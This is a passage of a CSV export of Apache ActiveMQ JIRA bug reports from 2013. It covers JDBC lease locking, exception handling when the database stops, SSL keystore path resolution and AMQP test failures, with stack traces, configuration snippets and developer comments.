2013,,,,,,,,,,,"0|i1mnh3:",340378,,,,,,,,,,,,,,,,,,,,,"31/Jul/13 22:06;tabish;Fixed TX handling to work with the QPid JMS client.  Messages in the TX will now get ack'd properly so that a commit actually has a sync count and the messages are consumed. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
fix script created by ./bin/activemq create to be able to pass command line args and run in the background,AMQ-4648,12659488,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,ceposta,ceposta,ceposta,24/Jul/13 03:50,24/Jul/13 04:09,14/Jul/23 05:43,24/Jul/13 04:09,5.8.0,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,"after creating a broker with ./bin/activemq create <path>

and running that broker with additional command lines eg:

./bin/newbroker start -Dproperty=value

the args are passed to the parent script in such a way to cause the broker to run in the foreground.",,ceposta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,339681,,,Wed Jul 24 04:09:37 UTC 2013,,,,,,,,,,,"0|i1ml5j:",340001,,,,,,,,,,,,,,,,,,,,,"24/Jul/13 04:09;ceposta;Resolved with svn commit r1506395;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The lease-database-locker does not work properly if slave broker system clock is behind Database server,AMQ-4645,12658817,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,19/Jul/13 19:46,12/Nov/15 10:51,14/Jul/23 05:43,22/Jul/13 12:12,5.8.0,,,,,5.9.0,,,Message Store,,,,0,clock,jdbc,lease,masterSlave,,,,,"The lease locker can adjust the lease duration based on the DB current time but this only works if the broker is ahead of the Db.
If the broker is behind, it will always obtain a lease due to incorrect adjustment.
If the clocks are in sync there is no issue.{code}
<persistenceAdapter>
        <jdbcPersistenceAdapter dataSource=""#oracle-ds"" lockKeepAlivePeriod=""5000"">
            <locker>
                <lease-database-locker lockAcquireSleepInterval=""10000""/>
            </locker>
        </jdbcPersistenceAdapter>
    </persistenceAdapter>{code}

The problem is that the negative diff is being treated as a positive diff.",jdbc master slave,gtully,joeluo,volkerk,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,339010,,,Thu Nov 12 07:26:50 UTC 2015,,,,,,,,,,,"0|i1mh0f:",339330,,,,,,,,,,,,,,,,,,,,,"22/Jul/13 12:12;gtully;diff now applied correctly. Additional tests to validate;;;","02/Oct/13 11:16;joeluo;The subject title of this JIRA is a bit misleading and it should be ""The lease-database-locker does not work properly slave broker system clock is ahead of Database server"". So it was a problem only when the slave broker system clock is ahead of the Database server but not behind.;;;","12/Nov/15 07:26;volkerk;Minor nitpick: Title is missing ""if"", and system is misspelled.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"JDBCPersistence DB stopped during message send with JDBCIOExceptionHandler configured; IOException/SQLException is sent back (sometimes) to the client before the transport connector is shutdown",AMQ-4643,12658747,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,pgfox,pgfox,19/Jul/13 13:39,30/Jul/13 20:36,14/Jul/23 05:43,30/Jul/13 20:24,5.8.0,,,,,5.9.0,,,,,,,0,,,,,,,,,"This related to AMQ-4636 JIRA for gtully's second point in comment https://issues.apache.org/jira/browse/AMQ-4636?focusedCommentId=13712196&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-13712196

Scenario:
- Producer sending persistent message (no transaction)
- JDBCIOExceptionHandler is configured 
- the underlying DB is shutdown during message send

Result:
One of two outcomes can happen:
1) the broker sends the an IOException/SQLException wrapped in a JMSException (below) back to the client and then shuts down the transport connectors.
2) the broker shuts down the transport connector when the IOException/SQLException is encountered.

Expected behavior:
As the JDBCIOHandler is configured which is handling the SQL exception, it would be good if the transport connectors were shutdown and no IOException/SQLException is reported to producer.

{code}
2013-07-19 15:22:05,436 [main           ] - ERROR pDBDuringProducerSendTopicTest - unexpected exception caught
javax.jms.JMSException: Database &apos;target/derbydb_15&apos; not found.
	at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:54)
	at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1391)
	at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1319)
	at org.apache.activemq.ActiveMQSession.send(ActiveMQSession.java:1809)
	at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:289)
	at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:224)
	at org.apache.activemq.ActiveMQMessageProducerSupport.send(ActiveMQMessageProducerSupport.java:241)
	at org.apache.activemq.store.jdbc.StopDBDuringProducerSendTopicTest.sendMessage(StopDBDuringProducerSendTopicTest.java:150)
	at org.apache.activemq.store.jdbc.StopDBDuringProducerSendTopicTest.testProducerWithDBShutdown(StopDBDuringProducerSendTopicTest.java:127)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at junit.framework.TestCase.runTest(TestCase.java:176)
	at junit.framework.TestCase.runBare(TestCase.java:141)
	at junit.framework.TestResult$1.protect(TestResult.java:122)
	at junit.framework.TestResult.runProtected(TestResult.java:142)
	at junit.framework.TestResult.run(TestResult.java:125)
	at junit.framework.TestCase.run(TestCase.java:129)
	at junit.framework.TestSuite.runTest(TestSuite.java:255)
	at junit.framework.TestSuite.run(TestSuite.java:250)
	at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:84)
	at org.apache.maven.surefire.junit4.JUnit4TestSet.execute(JUnit4TestSet.java:53)
	at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:123)
	at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:104)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.apache.maven.surefire.util.ReflectionUtils.invokeMethodWithArray(ReflectionUtils.java:164)
	at org.apache.maven.surefire.booter.ProviderFactory$ProviderProxy.invoke(ProviderFactory.java:110)
	at org.apache.maven.surefire.booter.SurefireStarter.invokeProvider(SurefireStarter.java:175)
	at org.apache.maven.surefire.booter.SurefireStarter.runSuitesInProcessWhenForked(SurefireStarter.java:81)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:68)
Caused by: java.io.IOException: Database &apos;target/derbydb_15&apos; not found.
	at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:45)
	at org.apache.activemq.store.jdbc.TransactionContext.getConnection(TransactionContext.java:68)
	at org.apache.activemq.store.jdbc.adapter.DefaultJDBCAdapter.doAddMessage(DefaultJDBCAdapter.java:218)
	at org.apache.activemq.store.jdbc.JDBCMessageStore.addMessage(JDBCMessageStore.java:123)
	at org.apache.activemq.store.memory.MemoryTransactionStore.addMessage(MemoryTransactionStore.java:327)
	at org.apache.activemq.store.memory.MemoryTransactionStore$2.asyncAddTopicMessage(MemoryTransactionStore.java:190)
	at org.apache.activemq.broker.region.Topic.doMessageSend(Topic.java:482)
	at org.apache.activemq.broker.region.Topic.send(Topic.java:446)
	at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:406)
	at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:431)
	at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:147)
	at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)
	at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:317)
	at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:152)
	at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:464)
	at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:751)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:294)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:149)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:288)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)
	at java.lang.Thread.run(Thread.java:680)
Caused by: java.sql.SQLException: Database &apos;target/derbydb_15&apos; not found.
	at org.apache.derby.impl.jdbc.SQLExceptionFactory40.getSQLException(Unknown Source)
	at org.apache.derby.impl.jdbc.Util.newEmbedSQLException(Unknown Source)
	at org.apache.derby.impl.jdbc.Util.newEmbedSQLException(Unknown Source)
	at org.apache.derby.impl.jdbc.Util.generateCsSQLException(Unknown Source)
	at org.apache.derby.impl.jdbc.EmbedConnection.newSQLException(Unknown Source)
	at org.apache.derby.impl.jdbc.EmbedConnection.handleDBNotFound(Unknown Source)
	at org.apache.derby.impl.jdbc.EmbedConnection.&lt;init&gt;(Unknown Source)
	at org.apache.derby.impl.jdbc.EmbedConnection30.&lt;init&gt;(Unknown Source)
	at org.apache.derby.impl.jdbc.EmbedConnection40.&lt;init&gt;(Unknown Source)
	at org.apache.derby.jdbc.Driver40.getNewEmbedConnection(Unknown Source)
	at org.apache.derby.jdbc.InternalDriver.connect(Unknown Source)
	at org.apache.derby.jdbc.EmbeddedDataSource.getConnection(Unknown Source)
	at org.apache.derby.jdbc.EmbeddedDataSource.getConnection(Unknown Source)
	at org.apache.activemq.store.jdbc.StopDBDuringProducerSendTopicTest$ReconnectingEmbeddedDataSource.getConnection(StopDBDuringProducerSendTopicTest.java:242)
	at org.apache.activemq.store.jdbc.TransactionContext.getConnection(TransactionContext.java:58)
	... 23 more
Caused by: java.lang.Throwable: org.apache.derby.impl.jdbc.EmbedSQLException: Database &apos;target/derbydb_15&apos; not found.
	at org.apache.derby.impl.jdbc.SQLExceptionFactory.getSQLException(Unknown Source)
	at org.apache.derby.impl.jdbc.SQLExceptionFactory40.wrapArgsForTransportAcrossDRDA(Unknown Source)
	... 38 more
{code}",- tested on trunk,gtully,pgfox,tmielke,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4636,,,,,,,,,,,,,"19/Jul/13 13:56;pgfox;AMQ4643Test.java;https://issues.apache.org/jira/secure/attachment/12593195/AMQ4643Test.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,338941,,,Tue Jul 30 20:29:14 UTC 2013,,,,,,,,,,,"0|i1mgl3:",339261,,,,,,,,,,,,,,,,,,,,,"19/Jul/13 13:56;pgfox;
Not sure if AMQ4643Test.java will reproduce the issue consistently (gtully mentioned a potential race condition) but it seems to consistently fail in my env;;;","30/Jul/13 20:24;gtully;fix in http://svn.apache.org/viewvc?view=revision&revision=r1508602

thanks for the test.
The ft/JDBCRestart* tests had workarounds for the non deterministic behaviour that are now removed.;;;","30/Jul/13 20:29;gtully;the fix was to introduce a SuppressReplyException that an IOExceptionHandler can use it to mask the current exception, it will be trapped by the transport so that a reply will not be propagated, the client will see a socket.close in place.

To get immediate notification of store failure on a client, the DefaultIOExceptionHandler needs to be configured to ingnoreAllErrors{code}
<broker ...>
 <ioExceptionHandler>
   <defaultIOExceptionHandler ignoreAllErrors=""true"" />
 </ioExceptionHandler>
 ...{code};;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
regression: SpringSslContext no longer supports classpath:filename syntax for referencing files,AMQ-4642,12658734,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,davsclaus,tswindells,tswindells,19/Jul/13 11:20,04/Nov/13 14:41,14/Jul/23 05:43,04/Nov/13 14:41,5.6.0,5.7.0,5.8.0,,,5.9.0,,,Broker,,,,0,easyfix,,,,,,,,"Previously keyStore and trustStore were Spring resources rather than strings. This meant the spring standard classpath:location syntax could be used to specify the file, eg:

	<bean id=""sslContext"" class=""org.apache.activemq.spring.SpringSslContext"">
		<property name=""keyStore"" value=""classpath:key.ks"" />
		<property name=""keyStorePassword"" value=""password"" />
		<property name=""trustStore"" value=""classpath:trust.ts"" />
		<property name=""trustStorePassword"" value=""password"" />
	</bean>

The change for AMQ-3268 means that this no longer works instead throwing the exception:

Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'sslContext': Invocation of init method failed; nested exception is java.net.MalformedURLException: unknown protocol: classpath
	at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:133)
Caused by: java.net.MalformedURLException: unknown protocol: classpath


The reason is in org.apache.activemq.spring.Utils:
   public static Resource resourceFromString(String uri) throws MalformedURLException {
        Resource resource;
        File file = new File(uri);
        if (file.exists()) {
            resource = new FileSystemResource(uri);
        } else if (ResourceUtils.isUrl(uri)) {
            resource = new UrlResource(uri);
        } else {
            resource = new ClassPathResource(uri);
        }
        return resource;
    }

The ResourceUtils.isUrl has explicit code to return true if the uri startsWith classpath, however UrlResource doesn't handle this.
A fix may be to change the line to be 
            resource = new UrlResource(ResourceUtils.getURL(uri));

ResourceUtils will then handle the classpath url, resolve it and return a valid url. An alternative fix would be for this code to do an explicit check for classpath: itself and if it is found pass the substring into ClassPathResource.",,davsclaus,tabish,tswindells,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4682,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,338928,,,Mon Nov 04 14:41:48 UTC 2013,,,,,,,Patch Available,,,,"0|i1mgi7:",339248,Regression,,,,,,,,,,,,,,,,,,,,"19/Jul/13 13:28;tabish;You should create a test case to show the problem and submit a patch, that way you can know your fix will remain into the future. ;;;","04/Nov/13 14:41;davsclaus;Gary has fixed this as part of AMQ-4682;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
JoramJmsTest QueryBrowserTest fails when run with amqp+nio,AMQ-4641,12658720,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,kearls,kearls,19/Jul/13 10:26,05/Sep/13 16:07,14/Jul/23 05:43,05/Sep/13 16:07,,,,,,,,,Test Cases,,,,0,,,,,,,,,"If you run QueryBrowserTest using amqp+nio, you get the following:


Tests run: 2, Failures: 2, Errors: 0, Skipped: 0, Time elapsed: 5.166 sec <<< FAILURE!
testSenderBrowser(org.objectweb.jtests.jms.conform.queue.QueueBrowserTest)  Time elapsed: 3.053 sec  <<< FAILURE!
junit.framework.AssertionFailedError: null
	at junit.framework.Assert.fail(Assert.java:55)
	at junit.framework.Assert.assertTrue(Assert.java:22)
	at junit.framework.Assert.assertTrue(Assert.java:31)
	at org.objectweb.jtests.jms.conform.queue.QueueBrowserTest.testSenderBrowser(QueueBrowserTest.java:103)

testBrowserWithMessageSelector(org.objectweb.jtests.jms.conform.queue.QueueBrowserTest)  Time elapsed: 2.051 sec  <<< FAILURE!
junit.framework.AssertionFailedError: expected:<1> but was:<0>
	at junit.framework.Assert.fail(Assert.java:57)
	at junit.framework.Assert.failNotEquals(Assert.java:329)
	at junit.framework.Assert.assertEquals(Assert.java:78)
	at junit.framework.Assert.assertEquals(Assert.java:234)
	at junit.framework.Assert.assertEquals(Assert.java:241)
	at org.objectweb.jtests.jms.conform.queue.QueueBrowserTest.testBrowserWithMessageSelector(QueueBrowserTest.java:142)


This may be similar to: https://issues.apache.org/jira/browse/AMQ-4376
",,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4707,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Aug/13 12:39;kearls;AMQ4641.patch;https://issues.apache.org/jira/secure/attachment/12596839/AMQ4641.patch","05/Sep/13 10:23;kearls;AMQ4641_final.patch;https://issues.apache.org/jira/secure/attachment/12601592/AMQ4641_final.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,338914,,,Thu Sep 05 16:07:02 UTC 2013,,,,,,,,,,,"0|i1mgf3:",339234,,,,,,,,,,,,,,,,,,,,,"19/Jul/13 18:24;tabish;One thing you might want to do is create a version of this test in the amqp test source and dump some broker info for that destination to see why the second browser thinks there are still two messages on the Queue, they should have been ack'd I think. ;;;","23/Jul/13 14:11;tabish;I ran this last night and noticed that if you run them alone the test passes so looks like a timing issue. ;;;","23/Jul/13 14:16;kearls;Yea, I think we had the same behavior with AMQ-4376.  I'll have to look at how Hiram fixed that.
;;;","02/Aug/13 20:15;tabish;Seems like this might be more on the QPid side.  It appears that Acks sent back aren't synchronous so the test can move on from a message receive and create a new QueueBrowser before all the messages that were read have been Ack'd at the broker side.  ;;;","05/Aug/13 12:27;kearls;Should I just add a sleep to the test?  Both pass if I add a one second sleep before calling browser.getEnumeration.
;;;","05/Aug/13 13:30;tabish;You can try that, what it looks like is that since the acks are fired and it doesn't wait for a response the NIO worker interleaves the work for the connection and processes an ack sometimes and then gets to the other connections new browser request before going back to process the other ack.  ;;;","08/Aug/13 08:02;kearls;I submitted a pull request for joram-jms-tests which should fix this. ;;;","08/Aug/13 12:39;kearls;After joram-jms-tests are updated, we need to update their version in the pom.;;;","04/Sep/13 17:57;tabish;I think in the case of these tests we should probably just disable those for now as the issue lies on the QPid JMS client side and not the broker side, perhaps open an issue there indicating that the client is behaving badly as a JMS client and doing async operations when it should be sync.  ;;;","05/Sep/13 10:23;kearls;This patch replaces the existing JoramJmsNioTest with one that doesn't run QueueBrowserTest.  After applying, you can close this bug, as I have updated AMQ-4375 to include all instances where test fail because of the qpid client.

(I've also included a minor change here to JoramSslTest.  It removes a redundant test declaration and and unneeded dependency on the Junit 3 TestCase class.  If you'd prefer I can open another bug and submit it separately.);;;","05/Sep/13 16:07;tabish;Applied latest patches.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
We should run JoramJmsTests with amqp+nio,AMQ-4640,12658717,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,kearls,kearls,19/Jul/13 10:13,23/Jul/13 14:51,14/Jul/23 05:43,23/Jul/13 14:51,,,,,,5.9.0,,,Test Cases,,,,0,,,,,,,,,"We should run the JoramJmsTests using amqp+nio in order to get test coverage of AmqpNioTransport and AmqpNioTransportFactory.

I will attach a patch.
",,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Jul/13 10:20;kearls;AMQ-4640.patch;https://issues.apache.org/jira/secure/attachment/12593162/AMQ-4640.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,338911,,,Tue Jul 23 14:51:17 UTC 2013,,,,,,,Patch Available,,,,"0|i1mgef:",339231,,,,,,,,,,,,,,,,,,,,,"23/Jul/13 14:51;tabish;Patch applied, thanks. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Tell broker to use only the space it thinks it has,AMQ-4638,12658542,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,rajdavies,rajdavies,rajdavies,18/Jul/13 15:28,18/Jul/13 15:56,14/Jul/23 05:43,18/Jul/13 15:56,5.8.0,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,Currently ActiveMQ logs a warning message - but it doesn't alter the values if less space is available than configured.,,rajdavies,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,338736,,,Thu Jul 18 15:56:15 UTC 2013,,,,,,,,,,,"0|i1mfbj:",339056,,,,,,,,,,,,,,,,,,,,,"18/Jul/13 15:56;rajdavies;fixed by SVN revision 1504506;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"JDBCPersistence DB stopped during message send; JMSException is sent back to client rather than shutting down connection",AMQ-4636,12658468,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,pgfox,pgfox,18/Jul/13 08:19,30/Jul/13 20:36,14/Jul/23 05:43,30/Jul/13 20:35,5.8.0,,,,,5.9.0,,,,,,,0,,,,,,,,,"Broker is configured to use JDBCIOExceptionHandler.

When the JDBCPersistence DB is stopped during a message send the broker returns the following javax.jms.JMSException back to the client rather than closing the connection.

This results in the client having to deal with the exception instead of the failover transport having to deal with a connection loss and redeliver the message. Failover transport and transport connection loss seems to be the approach used when other SQL exceptions are thrown.





{code}

Exception received on client side:

javax.jms.JMSException: ORA-01089: immediate shutdown in progress - no operation
s are permitted

        at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSuppo
rt.java:54)
        at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnect
ion.java:1391)
        at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnect
ion.java:1319)
        at org.apache.activemq.ActiveMQSession.send(ActiveMQSession.java:1798)
        at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProdu
cer.java:289)
        at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProdu
cer.java:224)
        at org.apache.activemq.ActiveMQMessageProducerSupport.send(ActiveMQMessa
geProducerSupport.java:241)
        at com.acme.MyPublisher.doIt(MyPublisher.java:50)
        at com.acme.MyPublisher.main(MyPublisher.java:26)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.
java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAcces
sorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at org.codehaus.mojo.exec.ExecJavaMojo$1.run(ExecJavaMojo.java:297)
        at java.lang.Thread.run(Thread.java:662)
Caused by: java.io.IOException: ORA-01089: immediate shutdown in progress - no o
perations are permitted

        at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport
.java:45)
        at org.apache.activemq.store.jdbc.TransactionContext.close(TransactionCo
ntext.java:141)
        at org.apache.activemq.store.jdbc.JDBCMessageStore.addMessage(JDBCMessag
eStore.java:129)
        at org.apache.activemq.store.memory.MemoryTransactionStore.addMessage(Me
moryTransactionStore.java:327)
        at org.apache.activemq.store.memory.MemoryTransactionStore$2.asyncAddTop
icMessage(MemoryTransactionStore.java:190)
        at org.apache.activemq.broker.region.Topic.doMessageSend(Topic.java:471)

        at org.apache.activemq.broker.region.Topic.send(Topic.java:435)
        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.
java:406)
        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java
:392)
        at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegion
Broker.java:282)
        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)
        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeD
estinationBroker.java:96)
        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.j
ava:317)
        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilt
er.java:135)
        at org.apache.activemq.broker.TransportConnection.processMessage(Transpo
rtConnection.java:499)
        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.jav
a:749)
        at org.apache.activemq.broker.TransportConnection.service(TransportConne
ction.java:329)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportC
onnection.java:184)
        at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport
.java:50)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireForm
atNegotiator.java:113)
        at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(Abs
tractInactivityMonitor.java:288)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSup
port.java:83)
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.jav
a:214)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:
196)
        ... 1 more
Caused by: java.lang.Throwable: java.sql.BatchUpdateException: ORA-01089: immedi
ate shutdown in progress - no operations are permitted

        at oracle.jdbc.driver.OraclePreparedStatement.executeBatch(OraclePrepare
dStatement.java:10296)
        at oracle.jdbc.driver.OracleStatementWrapper.executeBatch(OracleStatemen
tWrapper.java:216)
        at com.mchange.v2.c3p0.impl.NewProxyPreparedStatement.executeBatch(NewPr
oxyPreparedStatement.java:1723)
        at org.apache.activemq.store.jdbc.TransactionContext.executeBatch(Transa
ctionContext.java:106)
        at org.apache.activemq.store.jdbc.TransactionContext.executeBatch(Transa
ctionContext.java:84)
        at org.apache.activemq.store.jdbc.TransactionContext.close(TransactionCo
ntext.java:132)
{code}

Will attach a test case soon.
